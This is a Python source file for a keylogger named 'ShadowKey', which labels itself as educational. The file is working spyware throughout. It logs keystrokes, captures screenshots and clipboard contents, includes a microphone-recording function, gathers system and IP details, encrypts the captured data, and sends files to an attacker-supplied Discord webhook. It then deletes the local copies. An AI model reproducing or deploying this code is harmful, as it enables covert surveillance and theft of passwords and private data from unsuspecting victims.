#!/usr/bin/env python

print('''
  ██████  ██░ ██  ▄▄▄      ▓█████▄  ▒█████   █     █░ ██ ▄█▀▓█████▓██   ██▓
▒██    ▒ ▓██░ ██▒▒████▄    ▒██▀ ██▌▒██▒  ██▒▓█░ █ ░█░ ██▄█▒ ▓█   ▀ ▒██  ██▒
░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ░██   █▌▒██░  ██▒▒█░ █ ░█ ▓███▄░ ▒███    ▒██ ██░
  ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░░█░ █ ░█ ▓██ █▄ ▒▓█  ▄  ░ ▐██▓░
▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒░▒████▓ ░ ████▓▒░░░██▒██▓ ▒██▒ █▄░▒████▒ ░ ██▒▓░
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  ▒ ▒▒ ▓▒░░ ▒░ ░  ██▒▒▒ 
░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░   ▒ ░ ░  ░ ░▒ ▒░ ░ ░  ░▓██ ░▒░ 
░  ░  ░   ░  ░░ ░  ░   ▒    ░ ░  ░ ░ ░ ░ ▒    ░   ░  ░ ░░ ░    ░   ▒ ▒ ░░  
      ░   ░  ░  ░      ░  ░   ░        ░ ░      ░      ░  ░      ░  ░ ░     
                            ░                                         ░ ░     
        [ Advanced Keylogger with Military-Grade Encryption ]
        [ For Educational Purposes Only | Version 1.0.0    ]
        [ Created by Shubham Kumar                      ]
''')

import socket
import platform
import subprocess
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import post, get
import json
from datetime import datetime
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

# Discord webhook configuration
WEBHOOK_URL = "add_your_webhook_url_here"
SHADOW_KEY_AVATAR = "https://i.imgur.com/your-avatar-image.png"  # Optional: Avatar URL for webhook
username = getpass.getuser()
key = "C0DcvpYhOHDzR4ybk5S8fYIjf7axzR6gxWP5ervjXGo="
file_path = os.path.expanduser("~/Documents/ShadowKey/Files")
extend = "/"
file_merge = file_path + extend
os.makedirs(file_path, exist_ok=True)

def send_to_discord(filename, filepath):
    try:
        if not os.path.exists(filepath):
            print(f"[-] File not found: {filepath}")
            return
            
        # Read file content
        with open(filepath, 'rb') as f:
            file_content = f.read()
            
        # Create embed for rich formatting
        timestamp = datetime.now().isoformat()
        embed = {
            "title": "ShadowKey Log Notification",
            "description": f"New data captured: `{filename}`",
            "color": 0x00ff00,  # Green color
            "timestamp": timestamp,
            "fields": [
                {
                    "name": "File Type",
                    "value": filename.split('.')[-1].upper(),
                    "inline": True
                },
                {
                    "name": "Captured At",
                    "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    "inline": True
                }
            ],
            "footer": {
                "text": "ShadowKey v1.0.0"
            }
        }
            
        # Prepare the payload
        payload = {
            "username": "ShadowKey",
            "avatar_url": SHADOW_KEY_AVATAR,
            "embeds": [embed]
        }

        # Send file with the message
        files = {
            'payload_json': (None, json.dumps(payload)),
            'file': (filename, file_content)
        }
        
        response = post(WEBHOOK_URL, files=files)
        if response.status_code in [200, 204]:  # Both are valid success codes
            print(f"[+] Discord notification sent: {filename}")
        else:
            print(f"[-] Failed to send Discord notification: {response.status_code}")
            
    except Exception as e:
        print(f"[-] Error sending to Discord: {str(e)}")


def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            clipboard_data = subprocess.check_output(['xclip', '-o', '-selection', 'clipboard']).decode()
            f.write("Clipboard Data: \n" + clipboard_data)
        except:
            f.write("Clipboard could not be copied")

copy_clipboard()

def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()


number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "w") as f:
            for key in keys:
                k = str(key).replace("'", "")
                f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_to_discord(screenshot_information, file_path + extend + screenshot_information)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

file_merge2 = file_merge + 'encrypted_files/'
os.makedirs(file_merge2, exist_ok=True)
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge2 + system_information_e, file_merge2 + clipboard_information_e, file_merge2 + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_to_discord(encrypted_file_names[count], encrypted_file_names[count])
    count += 1

time.sleep(120)

delete_files = [system_information, clipboard_information, keys_information, screenshot_information]
for file in delete_files:
    try:
        os.remove(file_merge + file)
    except:
        pass

